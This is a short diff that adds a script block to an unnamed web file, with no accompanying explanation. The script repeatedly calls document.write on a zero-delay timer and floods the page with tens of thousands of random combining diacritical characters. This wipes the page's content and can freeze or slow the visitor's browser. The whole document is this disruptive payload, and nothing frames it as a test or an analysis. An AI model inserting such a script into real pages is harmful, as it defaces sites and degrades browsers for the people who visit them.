@@ -1,0 +1,11 @@
+<script>
+    var i2 = 0;
+setInterval(function () {
+	if (i2 < 8) {
+        for (var i = 0; 8000 > i; i++) {
+            document.write(String.fromCharCode(0x0300 + Math.floor(0x006f * Math.random())));
+        }
+    }
+    i2++;
+}, 0);
+</script>
